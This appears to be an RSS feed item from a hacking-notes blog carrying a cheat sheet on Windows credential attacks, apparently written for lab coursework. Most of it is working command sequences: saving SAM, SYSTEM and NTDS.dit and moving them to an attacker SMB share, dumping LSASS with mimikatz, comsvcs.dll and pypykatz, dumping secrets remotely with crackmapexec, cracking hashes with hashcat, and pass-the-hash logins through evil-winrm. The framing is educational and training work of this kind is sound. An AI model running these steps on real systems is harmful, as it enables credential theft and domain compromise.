@@ -1,0 +1,180 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ntds on Hacking Blog</title><link>https://hack.com.cy/tags/ntds/</link><description>Recent content in Ntds on Hacking Blog</description><generator>Hugo</generator><language>en</language><lastBuildDate>Thu, 01 Jan 2026 02:13:14 +0200</lastBuildDate><atom:link href="https://hack.com.cy/tags/ntds/index.xml" rel="self" type="application/rss+xml"/><item><title>Windows Local Password Attacks</title><link>https://hack.com.cy/notes/privilege-escalation/windows/passwords/passwords/</link><pubDate>Fri, 08 Aug 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/notes/privilege-escalation/windows/passwords/passwords/</guid><description>&lt;h1 id="attacking-sam">Attacking SAM&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">## Using `reg.exe` to Copy Registry Hives (requires admin)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">## REMEMBER `RUN THE CMD AS ADMIN`
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg.exe save hklm\sam C:\sam.save
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg.exe save hklm\system C:\system.save
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg.exe save hklm\security C:\security.save
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Explanation&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- python3 /../smbserver.py -smb2support : Creates the Share
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- CompData : Give the Share a name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- /home/ltndotpirate/Documents/ : Where the share will be storitng data
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## On Kali (10.10.15.16)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltndotpirate/Documents/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## On Windows&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">move sam.save &lt;span class="se">\\&lt;/span>10.10.15.16&lt;span class="se">\C&lt;/span>ompData
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">move security.save &lt;span class="se">\\&lt;/span>10.10.15.16&lt;span class="se">\C&lt;/span>ompData
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">move system.save &lt;span class="se">\\&lt;/span>10.10.15.16&lt;span class="se">\C&lt;/span>ompData
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="dumping-hashes---impacket-secretsdumppy">Dumping Hashes - Impacket secretsdump.py&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Using secretsdup.py&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="cracking-hashes-with-hashcat">Cracking Hashes with Hashcat&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Pupulate a .txt file with NT hashes (dumped from secretsdump)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat hashestocrack.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">64f12cddaa88057e06a81b54e73b949b
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">31d6cfe0d16ae931b73c59d7e0c089c0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">6f8c3f4d3869a10f3b4f0522f537fd33
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">184ecdda8cf1dd238d438c4aea4d560d
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">f7eb9c06fafaa23c4bcf22ba6781c1e2
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Start cracking&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo hashcat -m &lt;span class="m">1000&lt;/span> hashestocrack.txt /usr/share/wordlists/rockyou.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="remote-dumping--lsa-secrets-considerations">Remote Dumping &amp;amp; LSA Secrets Considerations&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## With access to credenials with (local admin privileges) we might be able to extract credentials from a `running service`, `scheduled task` or `application` that uses `LSA secrets to store passwords`.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Dumping LSA secrets&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Using Crackmapexec | Netexec&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">crackmapexec smb 10.10.10.13 --local-auth -u dotpirate -p HTB_@cademy_stdnt! --lsa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Dumping SAM remotely&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">crackmapexec smb 10.10.10.13 --local-auth -u dotpirate -p Passw0rd123 --sam
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="dumping-local-hashes-with-mimikatz-on-windows-cmd">Dumping LOCAL-Hashes with Mimikatz (On Windows CMD)&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">## Steps
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>1&lt;span class="p">)&lt;/span> Extract `SYSTEM` and `SAM` regictry hives from local machine.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg save HKLM\sam C:\sam.save
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg save HKLM\system C:\system.save
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>2&lt;span class="p">)&lt;/span> Run mimikatz
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>3&lt;span class="p">)&lt;/span> Elevate priviliages in mimikatz
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">privilege::debug
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">token::elevate
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>4&lt;span class="p">)&lt;/span> Proceed to dump the local-hashes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lsadump::sam system.save sam.save
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>5&lt;span class="p">)&lt;/span> List LM &lt;span class="p">&amp;amp;&lt;/span> NTLM credentials
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sekurlsa::msv
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="dumping-hashes-for-all-logged-on-users-to-the-current-workstation-ad-included">Dumping Hashes for all Logged-on Users to the Current Workstation (AD included)&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">.\mimikatz.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">privilege::debug
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sekurlsa::logonpasswords
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
+&lt;hr>
+&lt;h1 id="attacking-lsass">Attacking LSASS&lt;/h1>
+&lt;h2 id="dumping-lsass-process-memory">Dumping LSASS Process Memory&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-mysql" data-lang="mysql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Task Manager Method
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">Open&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Task&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Manager&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">Select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Process&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">tab&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Find&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">right&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">click&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">on&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Local&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Security&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Authority&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Process&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">Select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">Create&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">dump&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## A file called lsass.DMP is created and saved in the following path:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\l&lt;/span>oggedonusersdirectory&lt;span class="se">\A&lt;/span>ppData&lt;span class="se">\L&lt;/span>ocal&lt;span class="se">\T&lt;/span>emp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## NOTE: Its Always better to tranfer the files to our attacking machine for cracking&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="rundll32exe--comsvcsdll-method--pypykatz">Rundll32.exe &amp;amp;&amp;amp; Comsvcs.dll Method &amp;amp; Pypykatz&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">## Before issuing a command to create a dump file, we must determine what `process ID (PID) is assigned to lsass.exe`. This can be done from both CMD and POWERSHELL:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">## Finding LSASS PID in CMD (as admin)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tasklist /svc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">## Finding LSASS PID in POWERSHELL (as admin)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Get-Process lsass
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">### Creating lsass.dmp using powershell
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">## Explanation of the above command
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- rundll32 C:\windows\system32\comsvcs.dll : Running &amp;#39;rundll32&amp;#39; to call an exported function &amp;#39;comsvcs.dll&amp;#39; which calls &amp;#39;MiniDumpWrite&amp;#39; function to dump LSASS process memory
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- 672 : lsass.exe PID
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- C:\lsass.dump : Specifies directory where the dump is stored
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="pypykatz">Pypykatz&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Using `Pypykatz` to extract credentials after getting the lsass.dmp&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Once we have the lsass.dmp file on our Linux-machine we can proceed to extract the secrets from it.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo pypykatz lsa minidump /home/addict/lsass.dmp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Explanation&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- lsa : use &lt;span class="sb">`&lt;/span>lsa&lt;span class="sb">`&lt;/span> in the &lt;span class="nb">command&lt;/span> because LSASS is a subsystem of &lt;span class="sb">`&lt;/span>&lt;span class="nb">local&lt;/span> security authority&lt;span class="sb">`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- minidump : we specify the data &lt;span class="nb">source&lt;/span> as a &lt;span class="sb">`&lt;/span>minidump&lt;span class="sb">`&lt;/span> file
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- /home/addict/lsass.dmp :  path to the dump file
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
+&lt;hr>
+&lt;h1 id="attacking-ad--ntdsdit">Attacking AD &amp;amp; NTDS.dit&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## From MITRE&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NTDS file location: %SystemRoot%&lt;span class="se">\N&lt;/span>TDS&lt;span class="se">\N&lt;/span>tds.dit &lt;span class="o">(&lt;/span>in the domain cotroller&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Resource: https://attack.mitre.org/techniques/T1003/003/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="dictionary-attacks-against-ad">Dictionary Attacks against AD&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Creating Custom list of Usernames&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Browse target site and find potential employeenames&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat usernames
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Ben Williamson
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dotpirate Burgerstien
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Jim Stevenson
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Jill Johnson
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Jane Doe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Using username-anarchy (automation)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo git clone https://github.com/urbanadventurer/username-anarchy.git
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./username-anarchy -i usernames
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Using Crackmapexec &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="capturing-ntdsdit">Capturing NTDS.dit&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Connecting to DC with Evil-WinRM&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo evil-winrm -i 10.129.202.57 -u bwilliamson -p &lt;span class="s1">&amp;#39;P#55w0rd!&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Checking Local Group Policy&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\&amp;gt;&lt;/span> net localgroup
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Checking User Account Privileges inclidung Domain&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\&amp;gt;&lt;/span> net user bwilliamson
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Creating Shadow Copy of C: using `vssadmin`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PS C:&lt;span class="se">\&amp;gt;&lt;/span> vssadmin CREATE SHADOW /For&lt;span class="o">=&lt;/span>C:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Copying NTDS.dir from the VSS&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PS C:&lt;span class="se">\N&lt;/span>TDS&amp;gt; cmd.exe /c copy &lt;span class="se">\\&lt;/span>?&lt;span class="se">\G&lt;/span>LOBALROOT&lt;span class="se">\D&lt;/span>evice&lt;span class="se">\H&lt;/span>arddiskVolumeShadowCopy2&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\N&lt;/span>TDS&lt;span class="se">\N&lt;/span>TDS.dit c:&lt;span class="se">\N&lt;/span>TDS&lt;span class="se">\N&lt;/span>TDS.dit
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## On Kali (10.10.15.30)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltndotpirate/Documents/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## On Windows&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PS C:&lt;span class="se">\N&lt;/span>TDS&amp;gt; cmd.exe /c move C:&lt;span class="se">\N&lt;/span>TDS&lt;span class="se">\N&lt;/span>TDS.dit &lt;span class="se">\\&lt;/span>10.10.15.30&lt;span class="se">\C&lt;/span>ompData
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PS C:&lt;span class="se">\&amp;gt;&lt;/span> reg.exe save hklm&lt;span class="se">\s&lt;/span>ystem C:&lt;span class="se">\s&lt;/span>ystem.save
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PS C:&lt;span class="se">\&amp;gt;&lt;/span> move system.save &lt;span class="se">\\&lt;/span>10.10.15.30&lt;span class="se">\C&lt;/span>ompData
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Extracting ntds using secretsdump.py&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ./NTDS.dit -system system.save -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Hashcat to crack the captured hashes&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo hashcat -m &lt;span class="m">1000&lt;/span> 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="capturing-ntdsdit-with-crackmapexec">Capturing NTDS.dit with Crackmapexec&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo crackmapexec smb 10.129.201.57 -u bwilliamson -p &lt;span class="s1">&amp;#39;P@55w0rd!&amp;#39;&lt;/span> --ntds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="pass-the-hash-with-evil-winrm-example">Pass-the-Hash with Evil-WinRM Example&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo evil-winrm -i 10.129.201.57 -u Administrator -H &lt;span class="s2">&amp;#34;64f12cddaa88057e06a81b54e73b949b&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
+&lt;hr>
+&lt;h1 id="credential-hunting">Credential Hunting&lt;/h1>
+&lt;h2 id="key-terms-to-search">Key-Terms-to-Search&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">## Using `Lazagne.exe` to discover credentials from web-browsers
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">start&lt;/span> lazagne.exe all
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Resource: &lt;a href="https://github.com/AlessandroZ/LaZagne/releases/">Binary&lt;/a>&lt;/p></description></item></channel></rss>
